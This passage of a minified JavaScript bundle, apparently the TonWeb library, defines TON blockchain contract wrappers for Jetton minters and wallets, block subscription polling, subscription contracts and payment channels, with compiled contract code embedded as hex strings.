            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeAddress(t.newAdminAddress),
            e
          );
        }
        createEditContentBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(4, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            (e.refs[0] = s(t.jettonContentUri)),
            e
          );
        }
        async getJettonData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_jetton_data"),
            r = e[0],
            n = -1 === e[1].toNumber(),
            i = a(e[2]),
            s = e[3];
          let l = null;
          try {
            l = o(s);
          } catch (c) {}
          const h = e[4];
          return {
            totalSupply: r,
            isMutable: n,
            adminAddress: i,
            jettonContentCell: s,
            jettonContentUri: l,
            jettonWalletCode: h,
          };
        }
        async getJettonWalletAddress(t) {
          const e = await this.getAddress(),
            r = new i();
          r.bits.writeAddress(t);
          const n = await this.provider.call2(
            e.toString(),
            "get_wallet_address",
            [["tvm.Slice", c(await r.toBoc(!1))]],
          );
          return a(n);
        }
      }
      t.exports = { JettonMinter: JettonMinter };
    },
    8171: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { parseAddress: s } = r(3184),
        { BN: o } = r(2916),
        a =
          "B5EE9C7241021201000328000114FF00F4A413F4BCF2C80B0102016202030202CC0405001BA0F605DA89A1F401F481F481A8610201D40607020148080900BB0831C02497C138007434C0C05C6C2544D7C0FC02F83E903E900C7E800C5C75C87E800C7E800C00B4C7E08403E29FA954882EA54C4D167C0238208405E3514654882EA58C511100FC02780D60841657C1EF2EA4D67C02B817C12103FCBC2000113E910C1C2EBCB853600201200A0B020120101101F500F4CFFE803E90087C007B51343E803E903E90350C144DA8548AB1C17CB8B04A30BFFCB8B0950D109C150804D50500F214013E809633C58073C5B33248B232C044BD003D0032C032483E401C1D3232C0B281F2FFF274013E903D010C7E801DE0063232C1540233C59C3E8085F2DAC4F3208405E351467232C7C6600C03F73B51343E803E903E90350C0234CFFE80145468017E903E9014D6F1C1551CDB5C150804D50500F214013E809633C58073C5B33248B232C044BD003D0032C0327E401C1D3232C0B281F2FFF274140371C1472C7CB8B0C2BE80146A2860822625A020822625A004AD822860822625A028062849F8C3C975C2C070C008E00D0E0F009ACB3F5007FA0222CF165006CF1625FA025003CF16C95005CC2391729171E25008A813A08208989680AA008208989680A0A014BCF2E2C504C98040FB001023C85004FA0258CF1601CF16CCC9ED5400705279A018A182107362D09CC8CB1F5230CB3F58FA025007CF165007CF16C9718018C8CB0524CF165006FA0215CB6A14CCC971FB0010241023000E10491038375F040076C200B08E218210D53276DB708010C8CB055008CF165004FA0216CB6A12CB1F12CB3FC972FB0093356C21E203C85004FA0258CF1601CF16CCC9ED5400DB3B51343E803E903E90350C01F4CFFE803E900C145468549271C17CB8B049F0BFFCB8B0A0822625A02A8005A805AF3CB8B0E0841EF765F7B232C7C572CFD400FE8088B3C58073C5B25C60063232C14933C59C3E80B2DAB33260103EC01004F214013E809633C58073C5B3327B55200083200835C87B51343E803E903E90350C0134C7E08405E3514654882EA0841EF765F784EE84AC7CB8B174CFCC7E800C04E81408F214013E809633C58073C5B3327B55205ECCF23D";
      class JettonWallet extends n {
        constructor(t, e) {
          ((e.wc = 0), (e.code = e.code || i.oneFromBoc(a)), super(t, e));
        }
        async createTransferBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(260734629, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeCoins(t.jettonAmount),
            e.bits.writeAddress(t.toAddress),
            e.bits.writeAddress(t.responseAddress),
            e.bits.writeBit(!1),
            e.bits.writeCoins(t.forwardAmount || new o(0)),
            e.bits.writeBit(!1),
            t.forwardPayload && e.bits.writeBytes(t.forwardPayload),
            e
          );
        }
        async createBurnBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(1499400124, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeCoins(t.jettonAmount),
            e.bits.writeAddress(t.responseAddress),
            e
          );
        }
        async getData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_wallet_data"),
            r = e[0],
            n = s(e[1]),
            i = s(e[2]),
            o = e[3];
          return {
            balance: r,
            ownerAddress: n,
            jettonMinterAddress: i,
            jettonWalletCode: o,
          };
        }
      }
      ((JettonWallet.codeHex = a),
        (t.exports = { JettonWallet: JettonWallet }));
    },
    8172: function (t, e, r) {
      const { BlockSubscription: n } = r(8173),
        { InMemoryBlockStorage: i } = r(8174);
      t.exports = { BlockSubscription: n, InMemoryBlockStorage: i };
    },
    8173: function (t, e) {
      const r = 1e4,
        n = 1e3,
        i = (t) => ({
          workchain: t.workchain,
          shardId: t.shard,
          shardBlockNumber: t.seqno,
        });
      class BlockSubscription {
        constructor(t, e, i, s) {
          ((this.provider = t),
            (this.storage = e),
            (this.onBlock = i),
            (this.startMcBlockNumber = s ? s.startMcBlockNumber : void 0),
            (this.mcInterval = (s ? s.mcInterval : void 0) || r),
            (this.shardsInterval = (s ? s.shardsInterval : void 0) || n));
        }
        async start() {
          if (
            (this.stop(),
            !this.startMcBlockNumber &&
              ((this.startMcBlockNumber = (
                await this.provider.getMasterchainInfo()
              ).last.seqno),
              !this.startMcBlockNumber))
          )
            throw new Error("Cannot get start mc block number from provider");
          const t = await this.provider.getMasterchainBlockHeader(
            this.startMcBlockNumber,
          );
          if (((this.startLT = t.end_lt), !this.startLT))
            throw new Error("Cannot get startLT from provider");
          let e = !1;
          const r = async () => {
            if (!e) {
              e = !0;
              try {
                const t =
                  (await this.storage.getLastMasterchainBlockNumber()) ||
                  this.startMcBlockNumber;
                if (!t) throw new Error("no init masterchain block in storage");
                const e = (await this.provider.getMasterchainInfo()).last.seqno;
                if (!e)
                  throw new Error(
                    "invalid last masterchain block from provider",
                  );
                for (let r = t + 1; r < e; r++) {
                  const t = await this.provider.getBlockShards(r),
                    e = await this.provider.getMasterchainBlockHeader(r);
                  (await this.onBlock(e, t),
                    await this.storage.insertBlocks(r, t.shards.map(i)));
                }
              } catch (t) {
                console.error(t);
              }
              e = !1;
            }
          };
          ((this.mcIntervalId = setInterval(() => r(), this.mcInterval)), r());
          let n = !1;
          const s = async () => {
            if (!n) {
              n = !0;
              try {
                const t = await this.storage.getUnprocessedShardBlock();
                if (t) {
                  const { workchain: e, shardId: r, shardBlockNumber: n } = t,
                    s = await this.provider.getBlockHeader(e, r, n);
                  if (s.end_lt < this.startLT)
                    await this.storage.setBlockProcessed(e, r, n, []);
                  else {
                    await this.onBlock(s);
                    const t = s.prev_blocks.map(i);
                    await this.storage.setBlockProcessed(e, r, n, t);
                  }
                }
              } catch (t) {
                console.log(t);
              }
              n = !1;
            }
          };
          this.shardsIntervalId = setInterval(() => s(), this.shardsInterval);
        }
        stop() {
          (clearInterval(this.mcIntervalId),
            clearInterval(this.shardsIntervalId));
        }
      }
      t.exports = { BlockSubscription: BlockSubscription };
    },
    8174: function (t, e) {
      class InMemoryBlockStorage {
        constructor(t) {
          ((this.masterchainBlocks = {}),
            (this.shardchainBlocks = {}),
            (this.logFunction = t));
        }
        async insertShardBlocks(t) {
          for (const { workchain: e, shardId: r, shardBlockNumber: n } of t)
            void 0 === this.shardchainBlocks[e + "_" + r + "_" + n] &&
              (this.logFunction &&
                this.logFunction("insert shard " + e + " " + r + " " + n),
              (this.shardchainBlocks[e + "_" + r + "_" + n] = !1));
        }
        async insertBlocks(t, e) {
          if (
            (this.logFunction && this.logFunction("mc processed " + t),
            void 0 !== this.masterchainBlocks[t])
          )
            throw new Error("mc already exists " + t);
          ((this.masterchainBlocks[t] = !0), await this.insertShardBlocks(e));
        }
        async getLastMasterchainBlockNumber() {
          const t = Object.keys(this.masterchainBlocks)
            .map((t) => Number(t))
            .sort((t, e) => e - t);
          return t[0];
        }
        async setBlockProcessed(t, e, r, n) {
          if (
            (this.logFunction &&
              this.logFunction("shard processed " + t + " " + e + " " + r),
            void 0 === this.shardchainBlocks[t + "_" + e + "_" + r])
          )
            throw new Error("shard not exists " + t + "_" + e + "_" + r);
          ((this.shardchainBlocks[t + "_" + e + "_" + r] = !0),
            await this.insertShardBlocks(n));
        }
        async getUnprocessedShardBlock() {
          for (let t in this.shardchainBlocks)
            if (!1 === this.shardchainBlocks[t]) {
              const e = t.split("_");
              return {
                workchain: Number(e[0]),
                shardId: e[1],
                shardBlockNumber: Number(e[2]),
              };
            }
        }
      }
      t.exports = { InMemoryBlockStorage: InMemoryBlockStorage };
    },
    8175: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { hexToBytes: s, BN: o, nacl: a, bytesToBase64: l } = r(2916);
      class SubscriptionContract extends n {
        constructor(t, e) {
          ((e.code = i.oneFromBoc(
            "B5EE9C7241020F01000262000114FF00F4A413F4BCF2C80B0102012002030201480405036AF230DB3C5335A127A904F82327A128A90401BC5135A0F823B913B0F29EF800725210BE945387F0078E855386DB3CA4E2F82302DB3C0B0C0D0202CD06070121A0D0C9B67813F488DE0411F488DE0410130B048FD6D9E05E8698198FD201829846382C74E2F841999E98F9841083239BA395D497803F018B841083AB735BBED9E702984E382D9C74688462F863841083AB735BBED9E70156BA4E09040B0A0A080269F10FD22184093886D9E7C12C1083239BA39384008646582A803678B2801FD010A65B5658F89659FE4B9FD803FC1083239BA396D9E40E0A04F08E8D108C5F0C708210756E6B77DB3CE00AD31F308210706C7567831EB15210BA8F48305324A126A904F82326A127A904BEF27109FA4430A619F833D078D721D70B3F5260A11BBE8E923036F82370708210737562732759DB3C5077DE106910581047103645135042DB3CE0395F076C2232821064737472BA0A0A0D09011A8E897F821064737472DB3CE0300A006821B39982100400000072FB02DE70F8276F118010C8CB055005CF1621FA0214F40013CB6912CB1F830602948100A032DEC901FB000030ED44D0FA40FA40FA00D31FD31FD31FD31FD31FD307D31F30018021FA443020813A98DB3C01A619F833D078D721D70B3FA070F8258210706C7567228018C8CB055007CF165004FA0215CB6A12CB1F13CB3F01FA02CB00C973FB000E0040C8500ACF165008CF165006FA0214CB1F12CB1FCB1FCB1FCB1FCB07CB1FC9ED54005801A615F833D020D70B078100D1BA95810088D721DED307218100DDBA028100DEBA12B1F2E047D33F30A8AB0FE5855AB4",
          )),
            super(t, e),
            (this.methods.pay = () =>
              n.createMethod(t, this.createPayExternalMessage())),
            (this.methods.getSubscriptionData =
              this.getSubscriptionData.bind(this)));
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeAddress(this.options.wallet),
            t.bits.writeAddress(this.options.beneficiary),
            t.bits.writeGrams(this.options.amount),
            t.bits.writeUint(this.options.period, 32),
            t.bits.writeUint(this.options.startAt, 32),
            t.bits.writeUint(this.options.timeout, 32),
            t.bits.writeUint(0, 32),
            t.bits.writeUint(0, 32),
            t.bits.writeUint(0, 8),
            t.bits.writeUint(this.options.subscriptionId, 32),
            t
          );
        }
        createBody() {
          const t = new i();
          return (
            t.bits.writeUint(new o(1886156135).add(new o(2147483648)), 32),
            t
          );
        }
        createSelfDestructBody() {
          const t = new i();
          return (t.bits.writeUint(1685288050, 32), t);
        }
        async getSubscriptionData() {
          const t = (t) => t[0].toNumber() + ":" + t[1].toString(16),
            e = await this.getAddress(),
            r = await this.provider.call2(
              e.toString(),
              "get_subscription_data",
            ),
            n = t(r[0]),
            i = t(r[1]),
            s = r[2],
            o = r[3].toNumber(),
            a = r[4].toNumber(),
            l = r[5].toNumber(),
            h = r[6].toNumber(),
            c = r[7].toNumber(),
            u = r[8].toNumber(),
            d = r[9].toNumber();
          return {
            wallet: n,
            beneficiary: i,
            amount: s,
            period: o,
            startAt: a,
            timeout: l,
            lastPayment: h,
            lastRequest: c,
            failedAttempts: u,
            subscriptionId: d,
          };
        }
        async createPayExternalMessage() {
          const t = await this.getAddress(),
            e = n.createExternalMessageHeader(t),
            r = n.createCommonMsgInfo(e, null, null),
            s = new i();
          return (
            s.bits.writeUint(Math.floor(Date.now() / 1e3), 64),
            { address: t, message: r, body: s }
          );
        }
      }
      t.exports = { SubscriptionContract: SubscriptionContract };
    },
    8176: function (t, e, r) {
      const { PaymentChannel: n } = r(8177);
      class Payments {
        constructor(t) {
          this.provider = t;
        }
        createChannel(t) {
          return new n(this.provider, t);
        }
      }
      t.exports = { Payments: Payments, PaymentChannel: n };
    },
    8177: function (t, e, r) {
      var n = r(128);
      const { Contract: i } = r(3061),
        { Cell: s } = r(2917),
        { nacl: o, hexToBytes: a, BN: l } = r(2916),
        { parseAddress: h } = r(3184),
        {
          writePublicKey: c,
          writeSignature: u,
          createSignatureCell: d,
          tag_init: f,
          tag_cooperative_close: p,
          tag_cooperative_commit: w,
          tag_start_uncooperative_close: C,
          tag_challenge_state: g,
          tag_settle_conditionals: y,
          tag_state: m,
          op_top_up_balance: B,
          op_init_channel: A,
          op_cooperative_close: F,
          op_cooperative_commit: E,
          op_start_uncooperative_close: b,
          op_challenge_quarantined_state: v,
          op_settle_conditionals: D,
          op_finish_uncooperative_close: M,
          op_channel_closed: _,
          createTopUpBalance: T,
          createInitChannelBody: S,
          createCooperativeCloseChannelBody: k,
          createCooperativeCommitBody: x,
          createConditionalPayment: I,
          createSemiChannelBody: U,
          createSemiChannelState: R,
          createSignedSemiChannelState: N,
          createStartUncooperativeCloseBody: P,
          createChallengeQuarantinedStateBody: O,
          createSettleConditionalsBody: K,
          createFinishUncooperativeClose: W,
          createOneSignature: L,
          createTwoSignature: q,
        } = r(8178),
        H =
          "B5EE9C72410230010007FB000114FF00F4A413F4BCF2C80B0102012002030201480405000AF26C21F0190202CB06070201202E2F020120080902012016170201200A0B0201200C0D0009D3610F80CC001D6B5007434C7FE8034C7CC1BC0FE19E0201580E0F0201201011002D3E11DBC4BE11DBC43232C7FE11DBC47E80B2C7F2407320008B083E1B7B51343480007E187E80007E18BE80007E18F4FFC07E1934FFC07E1974DFC07E19BC01887080A7F4C7C07E1A34C7C07E1A7D01007E1AB7807080E535007E1AF7BE1B2002012012130201201415008D3E13723E11BE117E113E10540132803E10BE80BE10FE8084F2FFC4B2FFF2DFFC02887080A7FE12BE127E121400F2C7C4B2C7FD0037807080E53E12C073253E1333C5B8B27B5520004D1C3C02FE106CFCB8193E803E800C3E1096283E18BE10C0683E18FE10BE10E8006EFCB819BC032000CF1D3C02FE106CFCB819348020C235C6083E4040E4BE1124BE117890CC3E443CB81974C7C060841A5B9A5D2EBCB81A3E118074DFD66EBCB81CBE803E800C3E1094882FBE10D4882FAC3CB819807E18BE18FE12F43E800C3E10BE10E80068006E7CB8199FFE187C0320004120843777222E9C20043232C15401B3C594013E808532DA84B2C7F2DFF2407EC02002012018190201D42B2C0201201A1B0201201E1F0201201C1D00E5473F00BD401D001D401D021F90102D31F01821043436D74BAF2E068F84601D37F59BAF2E072F844544355F910F8454330F910B0F2E065D33FD33F30F84822B9F84922B9B0F2E06C21F86820F869F84A6E915B8E19F84AD0D33FFA003171D721D33F305033BC02BCB1936DF86ADEE2F800F00C8006F3E12F43E800C7E903E900C3E09DBC41CBE10D62F24CC20C1B7BE10FE11963C03FE10BE11A04020BC03DC3E185C3E189C3E18DB7E1ABC032000B51D3C02F5007400750074087E4040B4C7C0608410DB1BDCEEBCB81A3E118074DFD66EBCB81CBE111510D57E443E1150CC3E442C3CB8197E80007E18BE80007E18F4CFF4CFCC3E1208AE7E1248AE6C3CB81B007E1A3E1A7E003C042001C1573F00BF84A6EF2E06AD2008308D71820F9012392F84492F845E24130F910F2E065D31F018210556E436CBAF2E068F84601D37F59BAF2E072D401D08308D71820F901F8444130F910F2E06501D430D08308D71820F901F8454130F910F2E06501820020120222301FED31F01821043685374BAF2E068F84601D37F59BAF2E072D33FFA00F404552003D200019AD401D0D33FFA00F40430937F206DE2303205D31F01821043685374BAF2E068F84601D37F59BAF2E072D33FFA00F404552003D200019AD401D0D33FFA00F40430937F206DE23032F8485280BEF8495250BEB0524BBE1AB0527ABE19210064B05215BE14B05248BE17B0F2E06970F82305C8CB3F5004FA0215F40015CB3F5004FA0212F400CB1F12CA00CA00C9F86AF00C01C31CFC02FE129BACFCB81AF48020C235C6083E4048E4BE1124BE1178904C3E443CB81974C7C0608410DA19D46EBCB81A3E118074DFD66EBCB81CB5007420C235C6083E407E11104C3E443CB81940750C3420C235C6083E407E11504C3E443CB81940602403F71CFC02FE129BACFCB81AF48020C235C6083E4048E4BE1124BE1178904C3E443CB81974C7C0608410DB10DBAEBCB81A3E118074DFD66EBCB81CBD010C3E12B434CFFE803D0134CFFE803D0134C7FE11DBC4148828083E08EE7CB81BBE11DBC4A83E08EF3CB81C34800C151D5A64D6D4C8F7A2B98E82A49B08B8C3816028292A01FCD31F01821043685374BAF2E068F84601D37F59BAF2E072D33FFA00F404552003D200019AD401D0D33FFA00F40430937F206DE2303205D31F01821043685374BAF2E068F84601D37F59BAF2E072D33FFA00F404552003D200019AD401D0D33FFA00F40430937F206DE230325339BE5381BEB0F8495250BEB0F8485290BEB02502FE5237BE16B05262BEB0F2E06927C20097F84918BEF2E0699137E222C20097F84813BEF2E0699132E2F84AD0D33FFA00F404D33FFA00F404D31FF8476F105220A0F823BCF2E06FD200D20030B3F2E073209C3537373A5274BC5263BC12B18E11323939395250BC5299BC18B14650134440E25319BAB3F2E06D9130E30D7F05C82627002496F8476F1114A098F8476F1117A00603E203003ECB3F5004FA0215F40012CB3F5004FA0213F400CB1F12CA00CA00C9F86AF00C00620A8020F4966FA5208E213050038020F4666FA1208E1001FA00ED1E15DA119450C3A00B9133E2923430E202926C21E2B31B000C3535075063140038C8CB3F5004FA0212F400CB3F5003FA0213F400CB1FCA00C9F86AF00C00D51D3C02FE129BACFCB81AFE12B434CFFE803D010C74CFFE803D010C74C7CC3E11DBC4283E11DBC4A83E08EE7CB81C7E003E10886808E87E18BE10D400E816287E18FE10F04026BE10BE10E83E189C3E18F7BE10B04026BE10FE10A83E18DC3E18F780693E1A293E1A7C042001F53B7EF4C7C8608419F1F4A06EA4CC7C037808608403818830AEA54C7C03B6CC780C882084155DD61FAEA54C3C0476CC780820841E6849BBEEA54C3C04B6CC7808208407C546B3EEA54C3C0576CC780820840223AA8CAEA54C3C05B6CC7808208419BDBC1A6EA54C3C05F6CC780C60840950CAA46EA53C0636CC78202D0008840FF2F00075BC7FE3A7805FC25E87D007D207D20184100D0CAF6A1EC7C217C21B7817C227C22B7817C237C23FC247C24B7817C2524C3B7818823881B22A021984008DBD0CABA7805FC20C8B870FC253748B8F07C256840206B90FD0018C020EB90FD0018B8EB90E98F987C23B7882908507C11DE491839707C23B788507C23B789507C11DE48B9F03A4331C4966";
      class PaymentChannel extends i {
        constructor(t, e) {
          ((e.publicKeyA = e.isA ? e.myKeyPair.publicKey : e.hisPublicKey),
            (e.publicKeyB = e.isA ? e.hisPublicKey : e.myKeyPair.publicKey),
            (e.wc = e.wc || 0),
            (e.code = e.code || s.oneFromBoc(H)),
            super(t, e));
        }
        createDataCell() {
          var t, e, r;
          const n = new s();
          (n.bits.writeBit(0),
            n.bits.writeCoins(0),
            n.bits.writeCoins(0),
            c(n, this.options.publicKeyA),
            c(n, this.options.publicKeyB),
            n.bits.writeUint(this.options.channelId, 128));
          const i = new s();
          (i.bits.writeUint(
            (null === (t = this.options.closingConfig) || void 0 === t
              ? void 0
              : t.quarantineDuration) || 0,
            32,
          ),
            i.bits.writeCoins(
              (null === (e = this.options.closingConfig) || void 0 === e
                ? void 0
                : e.misbehaviorFine) || new l(0),
            ),
            i.bits.writeUint(
              (null === (r = this.options.closingConfig) || void 0 === r
                ? void 0
                : r.conditionalCloseDuration) || 0,
              32,
            ),
            (n.refs[0] = i),
            n.bits.writeUint(0, 32),
            n.bits.writeUint(0, 32),
            n.bits.writeBit(!1));
          const o = new s();
          return (
            o.bits.writeCoins(this.options.excessFee || new l(0)),
            o.bits.writeAddress(this.options.addressA),
            o.bits.writeAddress(this.options.addressB),
            (n.refs[1] = o),
            n
          );
        }
        async createOneSignature(t, e) {
          const r = o.sign.detached(
              await e.hash(),
              this.options.myKeyPair.secretKey,
            ),
            n = L({ op: t, isA: this.options.isA, signature: r, cell: e });
          return { cell: n, signature: r };
        }
        async createTwoSignature(t, e, r) {
          const n = o.sign.detached(
              await r.hash(),
              this.options.myKeyPair.secretKey,
            ),
            i = this.options.isA ? n : e,
            s = this.options.isA ? e : n,
            a = q({ op: t, signatureA: i, signatureB: s, cell: r });
          return { cell: a, signature: n };
        }
        async createTopUpBalance(t) {
          return T(t);
        }
        async createInitChannel(t) {
          return this.createOneSignature(
            A,
            S({ ...t, channelId: this.options.channelId }),
          );
        }
        async createCooperativeCloseChannel(t) {
          return (
            t.hisSignature || (t.hisSignature = new Uint8Array(64)),
            this.createTwoSignature(
              F,
              t.hisSignature,
              k({ ...t, channelId: this.options.channelId }),
            )
          );
        }
        async createCooperativeCommit(t) {
          return (
            t.hisSignature || (t.hisSignature = new Uint8Array(64)),
            this.createTwoSignature(
              E,
              t.hisSignature,
              x({ ...t, channelId: this.options.channelId }),
            )
          );
        }
        async createSignedSemiChannelState(t) {
          const e = R({
              channelId: this.options.channelId,
              semiChannelBody: U({
                seqno: t.mySeqno,
                sentCoins: t.mySentCoins,
                conditionals: null,
              }),
              counterpartySemiChannelBody:
                void 0 === t.hisSeqno
                  ? null
                  : U({
                      seqno: t.hisSeqno,
                      sentCoins: t.hisSentCoins,
                      conditionals: null,
                    }),
            }),
            r = o.sign.detached(
              await e.hash(),
              this.options.myKeyPair.secretKey,
            ),
            n = N({ signature: r, state: e });
          return { cell: n, signature: r };
        }
        async signState(t) {
          const e = this.options.isA ? t.seqnoA : t.seqnoB,
            r = this.options.isA ? t.seqnoB : t.seqnoA,
            n = this.options.initBalanceA.gt(t.balanceA)
              ? this.options.initBalanceA.sub(t.balanceA)
              : new l(0),
            i = this.options.initBalanceB.gt(t.balanceB)
              ? this.options.initBalanceB.sub(t.balanceB)
              : new l(0),
            s = this.options.isA ? n : i,
            o = this.options.isA ? i : n,
            { cell: a, signature: h } = await this.createSignedSemiChannelState(
              { mySeqno: e, mySentCoins: s, hisSeqno: r, hisSentCoins: o },
            );
          return h;
        }
        async verifyState(t, e) {
          const r = this.options.isA ? t.seqnoB : t.seqnoA,
            n = this.options.isA ? t.seqnoA : t.seqnoB,
            i = this.options.initBalanceA.gt(t.balanceA)
              ? this.options.initBalanceA.sub(t.balanceA)
              : new l(0),
            s = this.options.initBalanceB.gt(t.balanceB)
              ? this.options.initBalanceB.sub(t.balanceB)
              : new l(0),
            a = this.options.isA ? s : i,
            h = this.options.isA ? i : s,
            c = R({
              channelId: this.options.channelId,
              semiChannelBody: U({
                seqno: r,
                sentCoins: a,
                conditionals: null,
              }),
              counterpartySemiChannelBody:
                void 0 === n
                  ? null
                  : U({ seqno: n, sentCoins: h, conditionals: null }),
            }),
            u = await c.hash();
          return o.sign.detached.verify(
            u,
            e,
            this.options.isA
              ? this.options.publicKeyB
              : this.options.publicKeyA,
          );
        }
        async signClose(t) {
          const { cell: e, signature: r } =
            await this.createCooperativeCloseChannel(t);
          return r;
        }
        async verifyClose(t, e) {
          const r = await k({ ...t, channelId: this.options.channelId }),
            n = await r.hash();
          return o.sign.detached.verify(
            n,
            e,
            this.options.isA
              ? this.options.publicKeyB
              : this.options.publicKeyA,
          );
        }
        async createStartUncooperativeClose(t) {
          return this.createOneSignature(
            b,
            P({ ...t, channelId: this.options.channelId }),
          );
        }
        async createChallengeQuarantinedState(t) {
          return this.createOneSignature(
            v,
            O({ ...t, channelId: this.options.channelId }),
          );
        }
        async createSettleConditionals(t) {
          return this.createOneSignature(
            D,
            K({ ...t, channelId: this.options.channelId }),
          );
        }
        async createFinishUncooperativeClose() {
          return W();
        }
        async getChannelState() {
          const t = await this.getAddress(),
            e = await this.provider.call2(
              t.toString(),
              "get_channel_state",
              [],
            );
          return e.toNumber();
        }
        async getData() {
          const t = (t) => {
              let e = t.toString(16);
              return (e.length % 2 !== 0 && (e = "0" + e), a(e));
            },
            e = await this.getAddress(),
            r = await this.provider.call2(e.toString(), "get_channel_data", []),
            n = r[0].toNumber(),
            i = r[1][0],
            s = r[1][1],
            o = t(r[2][0]),
            l = t(r[2][1]),
            c = r[3],
            u = r[4][0].toNumber(),
            d = r[4][1],
            f = r[4][2].toNumber(),
            p = r[5][0],
            w = r[5][1],
            C = r[6],
            g = r[7][0],
            y = h(r[7][1]),
            m = h(r[7][2]);
          return {
            state: n,
            balanceA: i,
            balanceB: s,
            publicKeyA: o,
            publicKeyB: l,
            channelId: c,
            quarantineDuration: u,
            misbehaviorFine: d,
            conditionalCloseDuration: f,
            seqnoA: p,
            seqnoB: w,
            quarantine: C,
            excessFee: g,
            addressA: y,
            addressB: m,
          };
        }
        fromWallet(t) {
          const { wallet: e, secretKey: r } = t,
            n = (t, n) => {
              const i = async (i) => {
                const s = n ? (await this.createStateInit()).stateInit : null,
                  o = await this.getAddress(),
                  a = (await e.methods.seqno().call()) || 0,
                  l = await t;
                return e.methods.transfer({
                  secretKey: r,
                  toAddress: o.toString(!0, !0, !0),
                  amount: i,
                  seqno: a,
                  payload: l,
                  stateInit: s,
                  sendMode: 3,
                });
              };
              return {
                send: (t) => i(t).then((t) => t.send()),
                estimateFee: (t) => i(t).then((t) => t.estimateFee()),
              };
            };
          return {
            deploy: () => n(null, !0),
            init: (t) => n(this.createInitChannel(t).then((t) => t.cell)),
            topUp: (t) => n(this.createTopUpBalance(t)),
            close: (t) =>
              n(this.createCooperativeCloseChannel(t).then((t) => t.cell)),
            commit: (t) =>
              n(this.createCooperativeCommit(t).then((t) => t.cell)),
            startUncooperativeClose: (t) =>
              n(this.createStartUncooperativeClose(t).then((t) => t.cell)),
            challengeQuarantinedState: (t) =>
              n(this.createChallengeQuarantinedState(t).then((t) => t.cell)),
            settleConditionals: (t) =>
              n(this.createSettleConditionals(t).then((t) => t.cell)),
            finishUncooperativeClose: () =>
              n(this.createFinishUncooperativeClose()),
          };
        }
      }
      (n(PaymentChannel, "STATE_UNINITED", 0),
        n(PaymentChannel, "STATE_OPEN", 1),
        n(PaymentChannel, "STATE_CLOSURE_STARTED", 2),
        n(PaymentChannel, "STATE_SETTLING_CONDITIONALS", 3),
        n(PaymentChannel, "STATE_AWAITING_FINALIZATION", 4),
        (PaymentChannel.codeHex = H),
        (t.exports = { PaymentChannel: PaymentChannel }));
    },
    8178: function (t, e, r) {
      const { Cell: n } = r(2917),
        i = (t, e) => {
          if (32 !== e.length) throw new Error("invalid publicKey length");
          t.bits.writeBytes(e);
        },
        s = (t, e) => {
          if (64 !== e.length) throw new Error("invalid signature length");
          t.bits.writeBytes(e);
        },
        o = (t) => {
          const e = new n();
          return (s(e, t), e);
        },
        a = (t, e) => {
          if (e) {
            if ((t.bits.writeBit(1), t.refs.length >= 4))
              throw new Error("refs overflow");
            t.refs.push(e);
          } else t.bits.writeBit(0);
        },
        l = a,
        h = 1768843636,
        c = 1131179891,
        u = 1128492404,
        d = 1433289580,
        f = 1130915665,
        p = 1131168622,
        w = 1130910580,
        C = 1741148801,
        g = 235282626,
        y = 1433884798,
        m = 2040604399,
        B = 521476815,
        A = 143567410,
        F = 1727459433,
        E = 625158801,
        b = -572749638,
        v = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(C, 32),
            e.bits.writeCoins(t.coinsA),
            e.bits.writeCoins(t.coinsB),
            e
          );
        },
        D = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(h, 32),
            e.bits.writeUint(t.channelId, 128),
            e.bits.writeCoins(t.balanceA),
            e.bits.writeCoins(t.balanceB),
            e
          );
        },
        M = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(c, 32),
            e.bits.writeUint(t.channelId, 128),
            e.bits.writeCoins(t.balanceA),
            e.bits.writeCoins(t.balanceB),
            e.bits.writeUint(t.seqnoA, 64),
            e.bits.writeUint(t.seqnoB, 64),
            e
          );
        },
        _ = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(u, 32),
            e.bits.writeUint(t.channelId, 128),
            e.bits.writeUint(t.seqnoA, 64),
            e.bits.writeUint(t.seqnoB, 64),
            e
          );
        },
        T = (t) => {
          const e = new n();
          return (e.bits.writeCoins(t.amount), e.writeCell(t.condition), e);
        },
        S = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(t.seqno, 64),
            e.bits.writeCoins(t.sentCoins),
            l(e, t.conditionals),
            e
          );
        },
        k = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(w, 32),
            e.bits.writeUint(t.channelId, 128),
            e.writeCell(t.semiChannelBody),
            a(e, t.counterpartySemiChannelBody),
            e
          );
        },
        x = (t) => {
          const e = new n();
          return (s(e, t.signature), e.writeCell(t.state), e);
        },
        I = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(d, 32),
            e.bits.writeUint(t.channelId, 128),
            (e.refs[0] = t.signedSemiChannelStateA),
            (e.refs[1] = t.signedSemiChannelStateB),
            e
          );
        },
        U = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(f, 32),
            e.bits.writeUint(t.channelId, 128),
            (e.refs[0] = t.signedSemiChannelStateA),
            (e.refs[1] = t.signedSemiChannelStateB),
            e
          );
        },
        R = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(p, 32),
            e.bits.writeUint(t.channelId, 128),
            l(e, t.conditionalsToSettle),
            e
          );
        },
        N = () => {
          const t = new n();
          return (t.bits.writeUint(E, 32), t);
        },
        P = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(t.op, 32),
            e.bits.writeBit(t.isA),
            s(e, t.signature),
            e.writeCell(t.cell),
            e
          );
        },
        O = (t) => {
          const e = new n();
          return (
            e.bits.writeUint(t.op, 32),
            (e.refs[0] = o(t.signatureA)),
            (e.refs[1] = o(t.signatureB)),
            e.writeCell(t.cell),
            e
          );
        };
      t.exports = {
        writePublicKey: i,
        writeSignature: s,
